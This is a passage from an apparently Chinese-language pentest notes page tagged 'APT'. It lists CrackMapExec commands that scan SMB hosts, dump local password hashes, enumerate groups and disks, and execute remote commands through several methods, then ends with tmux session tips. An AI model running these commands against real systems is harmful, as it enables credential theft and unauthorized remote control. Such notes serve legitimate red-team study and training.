<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;Mac OSX</span><br><span class="line">pip install ‐‐user crackmapexec</span><br></pre></td></tr></table></figure>
<ul>
<li>获取smb信息</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cme smb 192.168.1.0&#x2F;24</span><br></pre></td></tr></table></figure>
<ul>
<li>密码策略</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cme smb 192.168.1.119 ‐u administrator ‐p &#39;123456&#39; ‐‐pass ‐pol</span><br></pre></td></tr></table></figure>
<ul>
<li>获取本地密码哈希</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cme smb 192.168.1.119 ‐u administrator ‐p &#39;123456&#39; ‐‐sam</span><br></pre></td></tr></table></figure>
<ul>
<li>枚举组</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cme smb 192.168.1.119 ‐u administrator ‐p &#39;123456&#39; ‐‐local‐groups</span><br></pre></td></tr></table></figure>
<ul>
<li>枚举目标机disk</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cme smb 192.168.1.6 ‐u administrator ‐p &#39;123456&#39; ‐‐disks</span><br></pre></td></tr></table></figure>
<ul>
<li><p>执行模式</p>
<ul>
<li>mmcexec</li>
<li>smbexec</li>
<li>wmiexec(默认)</li>
<li>atexec</li>
</ul>
</li>
<li><p>基于smbexec执行Command</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cme smb 192.168.1.6 ‐u administrator ‐p &#39;123456&#39; ‐‐exec‐method smbexec ‐x &#39;net user&#39;</span><br></pre></td></tr></table></figure>
<ul>
<li>基于dcom执行Command</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cme smb 192.168.1.6 ‐u administrator ‐p &#39;123456&#39; ‐‐exec‐method mmcexec ‐x &#39;whoami&#39;</span><br></pre></td></tr></table></figure>
<ul>
<li>基于wmi执行Command </li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cme smb 192.168.1.6 ‐u administrator ‐p &#39;123456&#39; ‐‐exec‐method wmiexec ‐x &#39;whoami&#39;</span><br><span class="line"></span><br><span class="line">cme smb 192.168.1.6 ‐u administrator ‐p &#39;123456&#39; ‐x &#39;whoami&#39;  &#x2F;&#x2F;-x 即采用默认方式</span><br></pre></td></tr></table></figure>
<ul>
<li>基于AT执行Command</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cme smb 192.168.1.6 ‐u administrator ‐p &#39;123456&#39; ‐‐exec‐method atexec ‐x &#39;calc&#39;</span><br></pre></td></tr></table></figure>
<h1 id="九、-其它"><a href="#九、-其它" class="headerlink" title="九、 其它"></a>九、 其它</h1><h2 id="36-解决vps上ssh掉线"><a href="#36-解决vps上ssh掉线" class="headerlink" title="36. 解决vps上ssh掉线"></a>36. 解决vps上ssh掉线</h2><ul>
<li><p>TMUX</p>
<blockquote>
<p>Tmux是一个优秀的终端复用软件，类似GNU Screen，但来自于OpenBSD，采用BSD授权。使用它最直 </p>
<p>观的好处就是，通过一个终端登录远程主机并运行tmux后，在其中可以开启多个控制台而无需再“浪 </p>
<p>费”多余的终端来连接这台远程主机</p>
</blockquote>
<blockquote>
<p>tmux new -s session1 新建会话 </p>
<p>ctrl+b d 退出会话，回到shell的终端环境 //tmux detach-client </p>
<p>tmux ls 终端环境查看会话列表 </p>
<p>ctrl+b s 会话环境查看会话列表 </p>
<p>tmux a -t session1 从终端环境进入会话 </p>
<p>tmux kill-session -t session1 销毁会话 </p>
<p>tmux rename -t old_session_name new_session_name 重命名会话 </p>
<p>ctrl + b $ 重命名会话 (在会话环境中)</p>
</blockquote>
</li>
</ul>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>APT</tag>
      </tags>
  </entry>
</search>
